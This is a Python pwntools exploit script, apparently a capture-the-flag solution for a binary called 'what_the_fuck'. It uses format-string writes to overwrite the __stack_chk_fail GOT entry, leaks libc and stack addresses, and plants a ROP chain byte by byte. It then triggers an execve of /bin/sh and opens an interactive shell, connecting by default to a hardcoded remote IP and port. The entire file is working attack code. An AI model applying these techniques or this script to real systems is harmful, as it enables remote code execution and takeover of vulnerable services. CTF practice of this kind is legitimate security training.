#/usr/bin/env python
from pwn import *

'''
def leak(address):
    io.recvuntil('input your name: ')
    sleep(0.1)
    io.sendline('xing')
    sleep(0.1)

    # leak read_addr
    payload = 'aaaa%8$s'
    payload += 'bbbbbbbb'
    payload += p64(address)
    payload = payload.ljust(0x20,'c')
    msg(payload)
    io.recvuntil('aaaa')
    content = io.recvuntil('bbbbbbbb',drop=True)
    if(len(content) == 0):
        log.info('{0} ==> NULL'.format(hex(address)))
        return "\x00"
    else:
        log.info("%#x ==> %s" % (address,(content or '').encode('hex')))
        return content
'''

def msg(payload):
    io.recvuntil('leave a msg: ')
    io.send(payload)

def cycle(number):
    if number>20:
        return number
    else:
        number = number+0x100
        return number

def exploit():
    io.recvuntil('input your name: ')
    io.sendline(p64(elf.got['__stack_chk_fail']))

    # Hijack _stack_chk_fail => main
    #gdb.attach(io, 'b *0x400963')
    payload = "%"+str(0x983)+'c%12$hn'+'AA%9$s'
    payload = payload.ljust(0x18,'c')
    payload += p64(elf.got['read']) 
    #trigger _stack_chk_fail to ROP 
    msg(payload)
    io.recvuntil('AA')
    read = u64(io.recvuntil('\x7f').ljust(0x8,"\x00"))
    log.info('read_addr:'+hex(read))

    syscall = read+0xe
    log.info('syscall:'+hex(syscall))

    #d = DynELF(leak,elf=ELF('./what_the_fuck'))
    #system_addr = d.lookup('system','libc')
    #log.info('system_addr:'+hex(system_addr))

    io.recvuntil('input your name: ')
    io.sendline('xing')

    payload = 'A'*10+'%10$ldCC'
    payload = payload.ljust(0x20,'B')
    msg(payload)
    io.recvuntil('A'*10)
    stack_addr = int(io.recvuntil('CC',drop=True),10)
    log.info('stack_addr:'+hex(stack_addr))
    
    io.recvuntil('input your name: ')
    io.sendline('xingxing')
    payload = p64(0)+p64(0x6010A0)+p64(0x400a60)
    payload += 'A'*0x8
    msg(payload)

    io.recvuntil('input your name: ')
    io.sendline(p64(0x400a60))
    payload = p64(0)+p64(1)+p64(elf.got['read'])+p64(0x3B)
    msg(payload)

    bss_addr = 0x6010A0
    temp = stack_addr-0xf0
    log.info('modify {0} ==> {1}'.format(hex(temp),hex(bss_addr)))
    for i in range(8):
        io.recvuntil('input your name: ')
        io.sendline('xing')
        payload = '%'+str(cycle((bss_addr>>(8*i))&0xff))+'c%9$hhn'
        payload = payload.ljust(0x18,'A')
        payload += p64(temp+i)
        msg(payload)

    temp = stack_addr-0xe8
    log.info('modify {0} ==> {1}'.format(hex(temp),hex(0)))
    for i in range(8):
        io.recvuntil('input your name: ')
        io.sendline('xing')
        payload = '%'+str(cycle(0))+'c%9$hhn'
        payload = payload.ljust(0x18,'A')
        payload += p64(temp+i)
        msg(payload)
    
    temp = stack_addr-0xd0
    log.info('modify {0} ==> {1}'.format(hex(temp),hex(0)))
    for i in range(8):
        io.recvuntil('input your name: ')
        io.sendline('xing')
        payload = '%'+str(cycle(0))+'c%9$hhn'
        payload = payload.ljust(0x18,'A')
        payload += p64(temp+i)
        msg(payload)

    temp = stack_addr-0xb8-0x60
    address = 0x400A7A
    log.info('modify {0} ==> {1}'.format(hex(temp),hex(address)))
    for i in range(8):
        io.recvuntil('input your name: ')
        io.sendline('xing')
        payload = '%'+str(cycle((address>>(8*i))&0xff))+'c%9$hhn'
        payload = payload.ljust(0x18,'A')
        payload += p64(temp+i)
        msg(payload)

    syscall_addr = 0x6010A8
    temp = stack_addr-0xc0
    log.info('modify {0} ==> {1}'.format(hex(temp),hex(syscall_addr)))
    for i in range(8):
        io.recvuntil('input your name: ')
        io.sendline('xing')
        payload = '%'+str(cycle((syscall_addr>>(8*i))&0xff))+'c%9$hhn'
        payload = payload.ljust(0x18,'A')
        payload += p64(temp+i)
        msg(payload)
    
    temp = stack_addr-0xb8
    log.info('modify {0} ==> {1}'.format(hex(temp),hex(0)))
    for i in range(8):
        io.recvuntil('input your name: ')
        io.sendline('xing')
        payload = '%'+str(cycle(0))+'c%9$hhn'
        payload = payload.ljust(0x18,'A')
        payload += p64(temp+i)
        msg(payload)

    io.recvuntil('input your name: ')
    io.sendline('xing')
    msg('ROP')
    io.recvuntil('ROP')
    raw_input('Go?')

    payload = "/bin/sh\x00"+p64(syscall)
    payload = payload.ljust(0x3b,'a')
    io.send(payload)

    io.interactive()

if __name__ == '__main__':
    context.binary = './what_the_fuck'
    #context.log_level = 'debug'
    context.terminal = ['tmux','sp','-h']
    elf = ELF('./what_the_fuck')
    if len(sys.argv)>1:
        io = remote(sys.argv[1],sys.argv[2])
        exploit()
    else:
        #io = process('./what_the_fuck')
        io = remote('106.75.66.195', 10000)
        exploit()

